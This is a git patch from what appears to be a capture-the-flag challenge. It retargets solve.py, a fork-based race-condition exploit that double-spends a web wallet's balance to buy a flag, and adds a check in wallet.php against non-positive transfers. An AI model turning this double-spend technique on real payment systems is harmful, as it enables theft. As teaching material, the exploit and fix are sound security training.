@@ -1,0 +1,66 @@
+From b55e34e113797634b87185687285629a01a42f28 Mon Sep 17 00:00:00 2001
+From: Adam Yi <i@adamyi.com>
+Date: Sat, 20 Jul 2019 18:59:42 +1000
+Subject: [PATCH] fix the unintended trivial solution
+
+---
+ solve.py       | 12 +++++++-----
+ www/wallet.php |  2 ++
+ 2 files changed, 9 insertions(+), 5 deletions(-)
+
+diff --git a/solve.py b/solve.py
+index b64e1f0..173943b 100644
+--- a/solve.py
++++ b/solve.py
+@@ -5,14 +5,16 @@
+ import uuid
+ import requests
+ 
++HOST = "k17coin.unswsecurity.com"
+ username = 'sol_' + str(uuid.uuid4())
++print(username)
+ cookies = {"username": username, "password": username}
+ pid = os.getpid()
+ 
+ print("init")
+-requests.post("http://127.0.0.1:12000/wallet.php?action=register", data=cookies)
++requests.post("http://" + HOST + "/wallet.php?action=register", data=cookies)
+ for i in range(1, 5):
+-  requests.post("http://127.0.0.1:12000/wallet.php?action=transfer", data={"from":str(i),"to":"0","amount":"100"}, cookies=cookies)
++  requests.post("http://" + HOST + "/wallet.php?action=transfer", data={"from":str(i),"to":"0","amount":"100"}, cookies=cookies)
+ 
+ print("forking")
+ os.fork() # 2
+@@ -23,7 +25,7 @@
+ os.fork() # 64
+ os.fork() # 128
+ 
+-requests.post("http://127.0.0.1:12000/wallet.php?action=transfer", data={"from":"0","to":"1","amount":"2"}, cookies=cookies)
++requests.post("http://" + HOST + "/wallet.php?action=transfer", data={"from":"0","to":"1","amount":"2"}, cookies=cookies)
+ 
+ if (os.getpid() != pid):
+   sys.exit(0)
+@@ -32,6 +34,6 @@
+ time.sleep(10)
+ 
+ print("finalizing")
+-requests.post("http://127.0.0.1:12000/wallet.php?action=transfer", data={"from":"1","to":"0","amount":"256"}, cookies=cookies)
+-res = requests.post("http://127.0.0.1:12000/wallet.php?action=buy", data={"subacc":"0", "item":"3"}, cookies=cookies).text
++requests.post("http://" + HOST + "/wallet.php?action=transfer", data={"from":"1","to":"0","amount":"256"}, cookies=cookies)
++res = requests.post("http://" + HOST + "/wallet.php?action=buy", data={"subacc":"0", "item":"3"}, cookies=cookies).text
+ print(re.search("FLAG{\w*}", res).group(0))
+diff --git a/www/wallet.php b/www/wallet.php
+index 0bc8442..095f675 100644
+--- a/www/wallet.php
++++ b/www/wallet.php
+@@ -78,6 +78,8 @@ function transfer() {
+   $amount = floatval($_POST['amount']);
+   if ($from < 0 || $to < 0 || $from > 4 || $to > 4)
+     die;
++  if ($amount <= 0)
++    die;
+ 
+   /* make sure subacc has enough money */
+   $result = $db->query("SELECT money FROM users WHERE username='".$db->escape_string($_COOKIE['username'])."' AND subacc=$from");
+Try Octotree Pro for free
+
